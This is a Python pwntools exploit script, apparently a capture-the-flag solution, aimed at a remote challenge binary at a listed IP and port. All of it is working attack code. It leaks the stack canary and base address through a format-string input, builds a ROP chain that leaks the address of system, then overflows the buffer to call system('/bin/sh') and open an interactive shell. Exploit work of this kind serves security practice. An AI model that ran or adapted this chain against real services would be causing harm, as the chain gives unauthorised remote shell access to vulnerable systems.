#!/usr/bin/env python

from pwn import *

context.log_level = "debug"
context(os="linux", arch="amd64")
context.terminal = ["tmux", "split-window", "-h"]
elf = ELF("./chal")
context.binary = elf

offset = 0x80 - 0x8

#p = process(elf.path)
p = remote("178.128.214.190", 1369)
#gdb.attach(
#    p,
#    """
#    break *(main+255)
#    continue
#    """,
#)

# Leak canary and program address
p.recv()
p.sendline(b"%45$p %49$p")

p.recvuntil(b"Welcome ")
leak = p.recvline().strip().split()
canary = int(leak[0][2:], 16)
log.info(f"{hex(canary)=}")
main = int(leak[1][2:], 16)
elf.address = main - elf.symbols["main"]
log.info(f"{hex(elf.address)=}")

rop = ROP(elf)
binsh = next(elf.search(b"/bin/sh\x00"))
log.info(f"{hex(binsh)=}")
ret = rop.find_gadget(['ret'])[0]
log.info(f"{hex(ret)=}")

# create payload
payload = offset * b"a" + p64(canary) + 8 * b"a"

# Leak system
p.recv()
rop.puts(elf.got["system"])
rop.main()
ropchain = rop.chain()
print(rop.dump())
p.sendline(payload + ropchain + p64(ret))
p.recv_raw(0x19e)
system_got = u64(p.recvline().strip().ljust(8,b"\x00"))
log.info(f"{hex(system_got)=}")


# rop to system
p.recv()
p.sendline(b"hello")
p.recv()

# create payload
payload = offset * b"a" + p64(canary) + 8 * b"a"
rop = ROP(elf)
rop.call(system_got, [binsh])
ropchain = rop.chain()
print(rop.dump())

p.sendline(payload + p64(ret) + ropchain)
p.interactive()
p.close()
